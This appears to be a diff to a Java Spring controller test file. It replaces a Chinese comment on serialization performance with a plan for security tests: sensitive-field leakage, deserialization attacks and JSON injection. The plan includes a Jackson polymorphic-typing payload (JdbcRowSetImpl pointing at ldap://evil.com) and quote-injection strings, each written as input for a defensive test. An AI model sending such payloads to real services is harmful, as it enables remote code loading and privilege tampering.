@@ -177,41 +177,48 @@ class HelloControllerTest {
 
     /*
      * =========================================================================
-     * 【性能优化】序列化测试性能（非可执行代码）
+     * 【安全测试】序列化安全与敏感字段泄露检测（非可执行代码）
      * =========================================================================
      *
-     * 一、ObjectMapper 性能
-     *   1) 创建开销：new ObjectMapper() 约 5-20ms（模块注册/配置解析）
-     *   2) 复用：ObjectMapper 线程安全，@BeforeAll 创建静态实例共享
-     *   3) 序列化开销：小对象约 0.01ms，大对象（100 字段）约 0.5ms
-     *   4) 反序列化：比序列化略慢（需实例化对象 + 设值）
-     *   结论：单次序列化开销极小，但不要在循环中每次 new ObjectMapper
+     * 一、敏感字段泄露测试
+     *   目标：确保 API 响应不包含敏感字段
+     *   1) password 字段测试：
+     *      创建含 password 的实体 -> 转 DTO -> 序列化 -> 断言 JSON 无 "password" 键
+     *      实现：jsonPath("$.password").doesNotExist()
+     *   2) 内部字段测试：
+     *      确保实体内部字段（如 Hibernate 代理标识）不出现在 JSON 中
+     *   3) 堆栈泄露测试：
+     *      触发 500 异常 -> 断言响应 JSON 无 "stackTrace"/"cause"/"localizedMessage"
+     *   4) 版本信息测试：
+     *      错误响应不含 Spring Boot 版本/JDK 版本/框架信息
      *
-     * 二、泛型反序列化的性能注意
-     *   1) TypeFactory.constructParametricType：构造 JavaType 约 0.01ms
-     *   2) TypeReference：匿名子类保留泛型签名，构造时反射获取，约 0.1ms
-     *   3) 两者性能差异可忽略，按可读性选择
-     *   4) 缓存 JavaType：高频反序列化场景缓存 TypeFactory 生成的 JavaType
+     * 二、反序列化安全测试
+     *   1) 多态反序列化攻击：
+     *      载荷：{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://evil.com/a","autoCommit":true}
+     *      防护：Jackson 禁用 default typing（spring.jackson.enable-default-typing=false）
+     *      测试：提交含 @type 的 JSON，预期被忽略或 400
+     *   2) 深层嵌套攻击：
+     *      载荷：1000 层嵌套的 JSON {"a":{"a":{"a":...}}}
+     *      防护：限制反序列化深度（Jackson StreamReadConstraints maxNestingDepth=100）
+     *      测试：提交超深嵌套，预期 400 而非 StackOverflowError
+     *   3) 超大 JSON 攻击：
+     *      载荷：10MB 的 JSON 数组
+     *      防护：限制请求体大小（spring.servlet.multipart.max-request-size=10MB）
+     *      测试：提交超大 JSON，预期 413 而非 OOM
      *
-     * 三、断言性能
-     *   1) assertEquals：直接比较，约 0.001ms
-     *   2) jsonPath：解析 JSON 树 + 路径求值，约 0.1-0.5ms
-     *   3) Hamcrest matcher：hasSize/is 链式断言，约 0.05ms
-     *   4) 结论：断言开销可忽略，按可读性选择
+     * 三、JSON 注入测试
+     *   1) 键名注入：{"username\":\"alice\",\"role\":\"ADMIN\":\"x"}
+     *      预期：JSON 解析失败，400
+     *   2) 值注入：username = "alice\", \"role\": \"ADMIN"
+     *      预期：Jackson 转义引号，role 不被注入
+     *   3) Unicode 转义：username = "\u0022role\u0022"
+     *      预期：Jackson 正确处理 Unicode 转义，无注入
      *
-     * 四、测试数据构建性能
-     *   1) 大对象构建：100 字段的 DTO 用 Builder 模式，比 setter 链快且清晰
-     *   2) 批量数据：IntStream.range(0,1000).mapToObj(...) 构建测试列表
-     *   3) 随机数据：EasyRandom/Instancio 自动生成测试对象，减少手写
-     *   4) 测试夹具：@BeforeEach 构建公共数据，@Test 只覆盖差异部分
-     *
-     * =========================================================================
-     * 【监控可观测性】序列化测试质量指标
-     * =========================================================================
-     *   - 序列化覆盖率：所有 DTO 都有序列化/反序列化测试
-     *   - JSON Schema 覆盖：响应结构有 Schema 校验
-     *   - 性能基线：大对象序列化 P99 < 10ms（回归测试）
-     *   - 兼容性：旧版本 JSON 能被新版本反序列化（向后兼容测试）
+     * 四、序列化完整性测试
+     *   1) 字段顺序稳定：同一对象多次序列化，字段顺序一致（或用 @JsonPropertyOrder）
+     *   2) null 处理：null 字段不出现（@JsonInclude NON_NULL）或值为 null
+     *   3) 类型一致：id 始终是数字，createdAt 始终是字符串（@JsonFormat）
+     *   4) 字段名一致：isXxx 不变成 xxx（@JsonProperty 固定）
      * =========================================================================
      */
 }
